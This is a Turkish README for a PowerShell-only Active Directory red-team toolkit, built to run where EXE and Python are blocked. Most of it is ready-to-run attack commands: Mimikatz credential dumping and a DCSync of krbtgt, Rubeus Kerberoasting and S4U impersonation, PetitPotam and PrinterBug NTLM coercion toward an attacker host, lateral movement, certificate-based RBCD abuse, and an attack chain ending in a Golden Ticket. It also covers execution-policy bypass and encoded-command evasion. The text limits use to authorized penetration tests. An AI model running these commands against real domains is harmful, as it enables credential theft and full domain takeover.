# AD Red Team PowerShell Toolkit

Şirket bilgisayarlarında EXE ve Python çalıştırma kısıtlaması olan ortamlar için tasarlanmış, **sadece PowerShell** ile çalışan Active Directory red team araç takımı.

## 🛡️ Tek Tıkla Salt Okunur Güvenlik Denetimi & HTML Raporu

Active Directory'ye **kesinlikle zarar vermeyen, hiçbir şeyi değiştirmeyen (salt okunur)** ve sonucu modern bir **HTML Dashboard** olarak raporlayan tek bağımsız script:

```powershell
# Canlı Active Directory denetimi yapıp HTML raporunu aç
.\Invoke-ADAuditReport.ps1 -OpenReport

# (İsteğe bağlı) Raporu belirli bir konuma kaydet
.\Invoke-ADAuditReport.ps1 -OutputPath "C:\Temp\AD-Audit.html" -OpenReport

# (Test amaçlı) AD olmayan bilgisayarda örnek veriyle test et
.\Invoke-ADAuditReport.ps1 -DemoMode -OpenReport
```

---

## 🚀 Hızlı Başlangıç (Tüm Toolkit)

```powershell
# Tüm araçları yükle (tek komut)
. .\AD-RedTeam-Toolkit.ps1

# Veya
Import-Module .\AD-RedTeam-Toolkit.ps1

# Yardım menüsü
Show-ToolkitHelp
```

> **Not:** Execution Policy engeli varsa önce şunu çalıştırın:
> ```powershell
> Set-ExecutionPolicy Bypass -Scope Process -Force
> ```

## 📦 Araç Listesi

### ✅ Doğrudan Kullanılabilir (Zaten PowerShell)
| Araç | Açıklama |
|------|----------|
| `PowerView.ps1` | AD enumeration (kullanıcılar, gruplar, ACL, trust) |
| `Powermad.ps1` | Makine hesabı ekleme, DNS manipülasyonu |
| `fix-gpo.ps1` | Parent domain'e GPO link'leme |

### 🔄 .NET Reflection ile Belleğe Yüklenen
Bu araçlar `.NET Assembly` oldukları için `[System.Reflection.Assembly]::Load()` ile diske yazmadan bellekte çalıştırılır.

| Wrapper | Orijinal | Açıklama |
|---------|----------|----------|
| `Invoke-Rubeus` | Rubeus.exe | Kerberoasting, AS-REP Roasting, ticket manipulation |
| `Invoke-SharpHound` | SharpHound.exe | BloodHound veri toplama |
| `Invoke-InternalMonologue` | InternalMonologue.exe | NetNTLM hash toplama (ağ trafiği yok) |
| `Invoke-PassTheCert` | PassTheCert.exe | ADCS sertifika ile authentication |
| `Invoke-SpoolSample` | SpoolSample.exe | Print Spooler NTLM coercion |

### 🔨 Sıfırdan Yazılmış (PowerShell Native)
| Araç | Yerine Geçtiği | Açıklama |
|------|-----------------|----------|
| `Invoke-PetitPotam` | PetitPotam.py | MS-EFSRPC NTLM coercion (P/Invoke ile) |
| `Invoke-Mimikatz` | mimikatz.exe | Mimikatz PE loader |
| `Invoke-LateralMovement` | PsExec.exe | WinRM, WMI, DCOM, Scheduled Task |
| `Invoke-ADExplorer` | ADExplorer.exe | 16 modlu AD keşif aracı (ADSI tabanlı) |

## 📖 Kullanım Örnekleri

### 1. Keşif (Reconnaissance)

```powershell
# Tüm kullanıcıları listele
Invoke-ADExplorer -Mode Users

# Admin hesaplarını göster
Invoke-ADExplorer -Mode Admins

# Kerberoast hedeflerini bul
Invoke-ADExplorer -Mode SPN

# AS-REP Roast hedeflerini bul
Invoke-ADExplorer -Mode ASREPRoast

# Domain Controller'ları listele
Invoke-ADExplorer -Mode DCs

# Trust ilişkileri
Invoke-ADExplorer -Mode Trusts

# Unconstrained Delegation nesneleri
Invoke-ADExplorer -Mode Unconstrained

# LAPS parolaları (okunabilirse)
Invoke-ADExplorer -Mode LAPS

# Tüm AD verisini snapshot olarak kaydet
Invoke-ADExplorer -Mode Snapshot -OutputPath .\snapshot.json

# Serbest LDAP sorgusu
Invoke-ADExplorer -Mode Search -LDAPFilter "(&(objectClass=user)(adminCount=1))"

# BloodHound için veri topla
Invoke-SharpHound -Command "--CollectionMethods All"
```

### 2. Credential Harvesting

```powershell
# Bellekteki parolaları çek (Admin gerekir)
Invoke-Mimikatz -DumpCreds

# DCSync saldırısı
Invoke-Mimikatz -Command "lsadump::dcsync /user:DOMAIN\krbtgt"

# NetNTLM hash toplama (ağ trafiği oluşturmaz)
Invoke-InternalMonologue
```

### 3. Kerberos Saldırıları

```powershell
# Kerberoasting
Invoke-Rubeus -Command "kerberoast"

# Hashcat formatında
Invoke-Rubeus -Command "kerberoast /format:hashcat /outfile:hashes.txt"

# AS-REP Roasting
Invoke-Rubeus -Command "asreproast /format:hashcat"

# Belirli kullanıcı
Invoke-Rubeus -Command "kerberoast /user:svc_mssql"

# S4U saldırısı
Invoke-Rubeus -Command "s4u /user:MACHINE$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target /ptt"
```

### 4. NTLM Coercion & Relay

```powershell
# PetitPotam - EFS coercion
Invoke-PetitPotam -Target DC01.domain.local -Listener 10.0.0.5

# Kimlik bilgileri ile
Invoke-PetitPotam -Target DC01 -Listener 10.0.0.5 -Username "user" -Password "pass" -Domain "domain.local"

# Tüm pipe'ları dene
Invoke-PetitPotam -Target DC01 -Listener 10.0.0.5 -Pipe all

# PrinterBug
Invoke-SpoolSample -Command "DC01.domain.local ATTACKER01.domain.local"
```

### 5. Lateral Movement

```powershell
# WinRM ile (varsayılan)
Invoke-LateralMovement -Target SERVER01 -Command "whoami /all"

# WMI ile
Invoke-LateralMovement -Target SERVER01 -Command "ipconfig" -Method WMI

# DCOM ile
Invoke-LateralMovement -Target SERVER01 -Command "hostname" -Method DCOM

# Scheduled Task ile
Invoke-LateralMovement -Target SERVER01 -Command "net user" -Method Task

# İnteraktif PS session
Invoke-LateralMovement -Target SERVER01 -Interactive

# Hangi yöntemler çalışıyor test et
Test-LateralMovementMethods -Target SERVER01
```

### 6. Certificate Abuse

```powershell
# Sertifika ile bilgisayar hesabı ekleme
Invoke-PassTheCert -Command "/server:dc01.domain.local /cert-path:admin.pfx /add-computer"

# RBCD ayarlama
Invoke-PassTheCert -Command "/server:dc01 /cert-path:cert.pfx /rbcd /target:SERVER01$"
```

## ⚠️ Troubleshooting

### Execution Policy Engeli
```powershell
# Sadece mevcut oturum için bypass
Set-ExecutionPolicy Bypass -Scope Process -Force

# Alternatif: Dosya içeriğini doğrudan çalıştır
IEX (Get-Content .\AD-RedTeam-Toolkit.ps1 -Raw)

# Alternatif: Encode edilmiş komut
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content .\script.ps1 -Raw)))
powershell -EncodedCommand $encoded
```

### Constrained Language Mode
```powershell
# Kontrol et
$ExecutionContext.SessionState.LanguageMode

# CLM aktifse .NET reflection çalışmaz!
# Sadece PS native araçlar kullanılabilir:
# - Invoke-ADExplorer
# - Invoke-LateralMovement
# - Invoke-PetitPotam
# - PowerView
# - Powermad
```

### AMSI Engeli
```powershell
# Script'ler AMSI tarafından engelleniyorsa
# obfuscation veya AMSI bypass teknikleri gerekebilir.
# Bu toolkit bu konuda yardımcı olmaz - ayrıca araştırın.
```

### WinRM Bağlantı Sorunları
```powershell
# WinRM aktif mi test et
Test-WSMan -ComputerName TARGET

# TrustedHosts ayarla
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "TARGET" -Force

# WinRM'i aktifleştir (admin gerekir)
Enable-PSRemoting -Force
```

## 🔗 Saldırı Zinciri (Attack Chain)

Tipik bir AD red team senaryosu:

```
1. Keşif
   Invoke-ADExplorer -Mode Users
   Invoke-ADExplorer -Mode SPN
   Invoke-ADExplorer -Mode Admins

2. Kerberoasting
   Invoke-Rubeus -Command "kerberoast /format:hashcat /outfile:hashes.txt"
   → Offline hash kırma (hashcat/john)

3. Lateral Movement
   Invoke-LateralMovement -Target SERVER01 -Command "whoami" -Method WinRM

4. Credential Dump
   Invoke-Mimikatz -DumpCreds

5. Domain Dominance
   Invoke-Mimikatz -Command "lsadump::dcsync /user:DOMAIN\krbtgt"
   → Golden Ticket

6. BloodHound
   Invoke-SharpHound -Command "--CollectionMethods All"
   → En kısa yolu bul
```

## ⚖️ Yasal Uyarı

Bu araçlar **yalnızca yetkili sızma testleri ve güvenlik değerlendirmeleri** için tasarlanmıştır. Yetkisiz kullanım yasadışıdır ve ciddi hukuki sonuçlar doğurabilir. Kullanmadan önce yazılı yetki belgesi aldığınızdan emin olun.
